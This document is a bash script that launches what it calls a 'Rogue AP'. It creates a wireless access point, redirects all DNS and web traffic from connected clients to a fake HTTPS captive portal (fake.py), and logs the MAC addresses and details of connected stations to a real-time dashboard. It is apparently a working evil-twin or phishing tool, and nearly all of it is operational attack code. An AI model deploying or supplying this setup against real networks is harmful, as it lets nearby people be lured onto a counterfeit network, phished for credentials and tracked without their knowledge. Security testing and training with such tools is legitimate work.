#!/bin/bash

# ─── CONFIGURATION ────────────────────────────────────────────────
IFACE="wlan0"
GATEWAY="10.0.0.1"
CERT_FILE="cert.crt"
KEY_FILE="cert.key"

# Create logs directory if it doesn't exist
mkdir -p logs

# ─── 1. Kill existing services ────────────────────────────────────
echo "[*] Stopping conflicting services..."
sudo pkill hostapd
sudo pkill dnsmasq
sudo pkill -f fake.py
sudo pkill -f http_redirect.py
sudo iptables -t nat -F
sudo iptables -F FORWARD

# ─── 2. Bring up interface ────────────────────────────────────────
echo "[*] Configuring $IFACE..."
echo "[DEBUG] Available interfaces:"
ip link show

echo "[DEBUG] Checking if $IFACE exists..."
if ! ip link show $IFACE >/dev/null 2>&1; then
    echo "[ERROR] Interface $IFACE not found. Available interfaces are:"
    ip link show | grep -o '^[0-9]: .*' | cut -d' ' -f2
    echo "Please edit IFACE variable in the script to match your wireless interface"
    exit 1
fi

# Remove existing IP if it exists
sudo ip addr del $GATEWAY/24 dev $IFACE 2>/dev/null

sudo ip link set $IFACE down
sudo iw dev $IFACE set type __ap
sudo ip addr add $GATEWAY/24 dev $IFACE
sudo ip link set $IFACE up

echo "[DEBUG] Interface configuration:"
ip addr show $IFACE

# ─── 3. Start hostapd ─────────────────────────────────────────────
echo "[*] Starting hostapd..."
echo "[DEBUG] Running hostapd with config:"
cat hostapd.conf

# Create control interface directory with proper permissions
sudo mkdir -p /var/run/hostapd
sudo chown root:root /var/run/hostapd
sudo chmod 755 /var/run/hostapd

# Start hostapd
sudo hostapd hostapd.conf -B
sleep 2

# Wait for hostapd to fully start and create control interface
echo "[DEBUG] Waiting for hostapd control interface..."
for i in {1..30}; do
    if [ -e "/var/run/hostapd/wlan0" ]; then
        echo "[DEBUG] Hostapd control interface is ready"
        break
    fi
    echo "[DEBUG] Waiting for hostapd control interface... attempt $i/30"
    sleep 1
done

# Monitor hostapd events
echo "[*] Setting up hostapd event monitoring..."
monitor_hostapd_events() {
    echo "[DEBUG] Starting hostapd event monitoring..."
    
    # Clear any existing monitors
    sudo pkill -f "hostapd_cli -i wlan0 -a"
    
    # Start hostapd_cli in monitor mode to catch all events
    sudo hostapd_cli -i wlan0 -a /bin/bash -c '
        # Send the raw event to our logging endpoint
        curl -X POST -H "Content-Type: text/plain" --data-binary "$0" https://localhost/api/log -k
    ' &
    
    # Start monitoring loop for active polling
    while true; do
        # Check if hostapd is running
        if ! pgrep hostapd > /dev/null; then
            echo "[ERROR] Hostapd process not found"
            sleep 5
            continue
        fi
        
        # Get list of connected stations
        STATIONS=$(sudo hostapd_cli -i wlan0 all_sta 2>/dev/null)
        if [ $? -eq 0 ] && [ ! -z "$STATIONS" ]; then
            echo "[DEBUG] Found stations: $STATIONS"
            echo "$STATIONS" | while read -r mac; do
                if [[ $mac =~ ^([0-9A-Fa-f:]{17}) ]]; then
                    # Get station info
                    INFO=$(sudo hostapd_cli -i wlan0 sta "$mac" 2>/dev/null)
                    if [ $? -eq 0 ]; then
                        echo "[DEBUG] Station info for $mac: $INFO"
                        echo "$INFO" | curl -X POST -H "Content-Type: text/plain" --data-binary @- https://localhost/api/log -k
                    fi
                fi
            done
        else
            echo "[DEBUG] No stations connected"
        fi
        
        sleep 2
    done &
}

# Start monitoring hostapd events
monitor_hostapd_events

# ─── 4. Start dnsmasq ─────────────────────────────────────────────
echo "[*] Starting dnsmasq..."
echo "[DEBUG] Running dnsmasq with config:"
cat dnsmasq.conf
sudo dnsmasq -C dnsmasq.conf

# ─── 5. Enable IP forwarding ──────────────────────────────────────
echo "[*] Enabling IP forwarding..."
sudo sysctl -w net.ipv4.ip_forward=1 > /dev/null

# ─── 6. Set iptables rules ────────────────────────────────────────
echo "[*] Setting iptables rules..."

# Redirect HTTP/HTTPS to Flask
sudo iptables -t nat -A PREROUTING -i $IFACE -p tcp --dport 80 -j REDIRECT --to-port 80
sudo iptables -t nat -A PREROUTING -i $IFACE -p tcp --dport 443 -j REDIRECT --to-port 443

# NAT masquerade
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

# ─── 6a. Allow CDN IPs for resources (from wlan0 to eth0) ─────────

# Bootstrap CDN
sudo iptables -A FORWARD -i $IFACE -o eth0 -d 104.18.11.207 -j ACCEPT
sudo iptables -A FORWARD -i $IFACE -o eth0 -d 104.18.10.207 -j ACCEPT

# jQuery CDN
sudo iptables -A FORWARD -i $IFACE -o eth0 -d 151.101.130.137 -j ACCEPT
sudo iptables -A FORWARD -i $IFACE -o eth0 -d 151.101.66.137 -j ACCEPT
sudo iptables -A FORWARD -i $IFACE -o eth0 -d 151.101.194.137 -j ACCEPT
sudo iptables -A FORWARD -i $IFACE -o eth0 -d 151.101.2.137 -j ACCEPT

# FontAwesome CDN
sudo iptables -A FORWARD -i $IFACE -o eth0 -d 104.17.25.14 -j ACCEPT
sudo iptables -A FORWARD -i $IFACE -o eth0 -d 104.17.24.14 -j ACCEPT

# Allow response traffic from internet
sudo iptables -A FORWARD -i eth0 -o $IFACE -m state --state RELATED,ESTABLISHED -j ACCEPT

# Block everything else from clients
sudo iptables -A FORWARD -i $IFACE -o eth0 -j DROP

# ─── 7. Start Flask servers ───────────────────────────────────────
echo "[*] Launching Flask HTTPS portal (port 443)..."
sudo python3 fake.py 2>&1 | tee logs/fake.log &

echo "[*] Launching Flask HTTP redirector (port 80)..."
sudo python3 http_redirect.py 2>&1 | tee logs/redirect.log &

# Wait a moment for servers to start
sleep 2

# Check if servers are running
echo "[DEBUG] Checking if Flask servers are running..."
if pgrep -f "python3 fake.py" > /dev/null; then
    echo "[✓] HTTPS server is running"
else
    echo "[!] ERROR: HTTPS server failed to start. Check logs/fake.log"
fi

if pgrep -f "python3 http_redirect.py" > /dev/null; then
    echo "[✓] HTTP redirector is running"
else
    echo "[!] ERROR: HTTP redirector failed to start. Check logs/redirect.log"
fi

# ─── 8. Done ──────────────────────────────────────────────────────
echo "[✓] Rogue AP is live at $GATEWAY"
echo "[✓] DNS is redirecting all domains to captive portal"
echo "[✓] CDN whitelisting is active"
echo "[✓] Created by WarrenWarren5454"

# ─── 9. Interactive Loop ──────────────────────────────────────────
while true; do
    echo ""
    echo "[*] Options:"
    echo "[1] Stop Rogue AP and Flask Servers"
    echo "[2] Open Real-Time Dashboard"

    read -p "Select an option: " choice

    if [[ "$choice" == "1" ]]; then
        echo "[*] Stopping services..."
        sudo pkill hostapd
        sudo pkill dnsmasq
        sudo pkill -f fake.py
        sudo pkill -f http_redirect.py
        sudo iptables -t nat -F
        sudo iptables -F FORWARD
        sudo ip link set $IFACE down
        echo "[✓] Rogue AP stopped."
        exit 0

    elif [[ "$choice" == "2" ]]; then
        echo "[*] Opening dashboard at http://10.0.0.1/dashboard"
        xdg-open "https://10.0.0.1/dashboard" >/dev/null 2>&1 &
    
    else
        echo "[↻] Menu refreshed. Press [1] to quit or [2] to open dashboard."
    fi
done


